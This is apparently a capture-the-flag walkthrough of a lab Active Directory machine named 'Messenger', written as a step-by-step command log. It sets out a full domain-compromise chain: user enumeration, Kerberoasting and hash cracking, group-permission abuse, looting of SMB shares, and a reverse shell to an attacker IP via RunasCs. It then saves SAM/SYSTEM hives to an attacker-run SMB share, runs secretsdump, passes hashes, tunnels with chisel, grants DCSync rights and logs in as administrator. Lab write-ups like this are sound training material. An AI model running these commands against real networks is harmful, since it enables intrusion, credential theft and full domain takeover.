# Messenger

## Enumeration

### Assumed breach Credentials

```
Username: kyoma
Password: FutureGadget17
```



### Port scanning with rustscan and nmap&#x20;

```
Command:- rustscan -a 10.1.22.146 -- -A
Command:- nmap 10.1.126.164
Command:- nmap 10.1.125.99
```

```
Open 10.1.22.146:53
Open 10.1.22.146:88
Open 10.1.22.146:135
Open 10.1.22.146:139
Open 10.1.22.146:389
Open 10.1.22.146:445
Open 10.1.22.146:464
Open 10.1.22.146:593
Open 10.1.22.146:636
Open 10.1.22.146:3268
Open 10.1.22.146:3269
Open 10.1.22.146:3389
Open 10.1.22.146:5985
Open 10.1.22.146:9389
Open 10.1.22.146:49664
Open 10.1.22.146:49667
Open 10.1.22.146:49670
Open 10.1.22.146:49669
Open 10.1.22.146:49684
Open 10.1.22.146:59732
Open 10.1.22.146:59743

nmap 10.1.126.164 -Pn 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-19 10:45 -0400
Nmap scan report for 10.1.126.164
Host is up (0.049s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 7.04 seconds
                                                                       ]
└─# nmap 10.1.125.99      
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-19 10:45 -0400
Nmap scan report for 10.1.125.99
Host is up (0.053s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman



```

### &#x20;Domain enumeration with rpcclient

Copy the list of users by leveraging the initial access of user kyoma with

```
Command:- rpcclient -U kyoma%'FutureGadget17' 10.1.22.146 -c enumdomusers

copy the domain users list in a file users.txt

```



### Kerberoasting

Identified that the domain user account kyoma has a Service Principal Name (SPN) configured for svc\_backup

```
Command:- GetUserSPNs.py sern.local/kyoma:FutureGadget17 -dc-ip 10.1.22.146 -request

For clock screw issues update the time 
Command:- ntpdate -u 10.1.22.146
```

<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

Hash was cracked with hashcat and gained svc\_backup user access&#x20;

```
Command:- hashcat -m 13100 hash rockyou.txt
```

<figure><img src="../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

svc\_backup access across all IP address, but no access to shares DEV and HR

<figure><img src="../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

### Bloodhound-python&#x20;

data collection shows that svc\_backup user has generic write and add-self right over file management group

```
Command:- bloodhound-python -u 'svc_backup' -p 'Redacted' -d 'sern.local' -ns 10.1.22.146 -c all --zip 
```

<figure><img src="../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>



Adding svc\_backup to file management group with bloodyAD to gain access to shares like DEV and HR&#x20;

```
Command:- bloodyAD --host 10.1.22.146 -d 'sern.local' -u 'svc_backup' -p 'Redacted' add groupMember 'File Management' 'svc_backup'
```

with nxc verified that shares HR & DEV are accessible now  on 10.1.126.164 which is FileSRV01

<figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

Connect and download the files that are present in those shares&#x20;

```
Command:- python3 /usr/share/doc/python3-impacket/examples/smbclient.py sern.local/'svc_backup':'Redacted'@10.1.126.164

To select a share -> use DEV 
To list the files in a share -> ls 
To download the files from a share -> mget *

```

<figure><img src="../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

Found the password for user nae in config file and credentials are valid&#x20;

<figure><img src="../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

### Port 5985 - winrm&#x20;

nothing was found, but svc\_backup is in the users list we can use runasCs.exe to get shell access as svc\_backup

<figure><img src="../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

upload runasCs.exe to get a a full shell terminal access, start nc listener on a random port to get the connection as svc\_backup before running runas.exe command&#x20;

```
Command:- .\runas.exe 'svc_backup' 'Redacted' cmd.exe -r 10.200.109.114:4444 --bypass-uac
```

<figure><img src="../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

### Registry Hive Dumping (SAM/SYSTEM)

Although, backup privileges are disabled on the system, but still can exfiltrate data with reg.py, which is a windows registry script&#x20;

<figure><img src="../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

Used reg.py to exfiltrate the SAM and SYSTEM resgistry files, start smbserver on another terminal

```
python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.1.126.164,63269)
[*] AUTHENTICATE_MESSAGE (\,FILESRV01)
[*] User FILESRV01\ authenticated successfully




python3 /usr/share/doc/python3-impacket/examples/reg.py 'sern.local'/'svc_backup':'Redacted'@10.1.126.164 save -keyName 'HKLM\SAM' -o '\\10.200.109.114\share'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
[*] Saved HKLM\SAM to \\10.200.109.114\share\SAM.save

python3 /usr/share/doc/python3-impacket/examples/reg.py 'sern.local'/'svc_backup':'Redacted'@10.1.126.164 save -keyName 'HKLM\SYSTEM' -o '\\10.200.109.114\share'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
[*] Saved HKLM\SYSTEM to \\10.200.109.114\share\SYSTEM.save

```

with the help of registry file, can do secretsdump.py and retrieve hashes for domain users&#x20;

```
Command:- secretsdump.py -sam SAM.save -system SYSTEM.save local
```

<figure><img src="../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

Used pass the hash attack to gain access as moeka on 10.1.125.99 which is MSGSRV01

<figure><img src="../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

On users desktop found reminders file, download it and gained clear text password for user moeka

<figure><img src="../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

Nothing was found in privileges or misconfigurations but found an intersting folder in Program Files directory called as output messenger server&#x20;

Upon reseraching more about this server, identified that, it has web,file transfer, api and other ports related to it

[https://www.outputmessenger.com/output-messenger-configuration/ ](https://www.outputmessenger.com/output-messenger-configuration/)

<figure><img src="../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

```
Command:- netstat -ano | findstr LISTENING
```

<figure><img src="../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

Particularly intrested in port 14123 because it is assigned to web server, did a port forwarding with chisel to access the web server&#x20;

```
Command:- 

./chisel server --reverse --port 3333 
2026/10/19 13:00:41 server: Reverse tunnelling enabled
2026/10/19 13:00:41 server: Fingerprint 9EhYWhdEh6ju2fspTXP0Yukb3IB33Hks0vmozgjt7L0=
2026/10/19 13:00:41 server: Listening on http://0.0.0.0:3333
2026/10/19 13:05:36 server: session#1: tun: proxy#R:14111=>14123: Listening


 C:\Users\moeka> .\chisel.exe client 10.200.109.114:3333 R:14111:127.0.0.1:14123
```

Used credentials that was found in reminders.xls file and gained access as user moeka

<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

In the chat room page, able to acquire clear text password for user braun&#x20;

<figure><img src="../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

Braun has writedacl permission on domain&#x20;

<figure><img src="../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

can abuse this privilege by giving DCSync rights

```
Command:- python3 /usr/share/doc/python3-impacket/examples/dacledit.py -action write -rights 'DCSync' -principal 'braun' -target-dn 'DC=SERN,DC=LOCAL' 'sern.local'/'braun':'Redacted'


command:- python3 /usr/share/doc/python3-impacket/examples/secretsdump.py sern.local/braun:'Redacted'@10.1.22.146
```

<figure><img src="../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>



### Pass the hash attack&#x20;

```
Command:- nxc winrm 10.1.22.146 -u administrator -H 'Redacted'
```

<figure><img src="../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>



### root.txt

```
Command:- evil-winrm -i 10.1.22.146 -u administrator -H 'Redacted'

Command:- type C:\Users\administrator\Desktop\root.txt
```

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>















































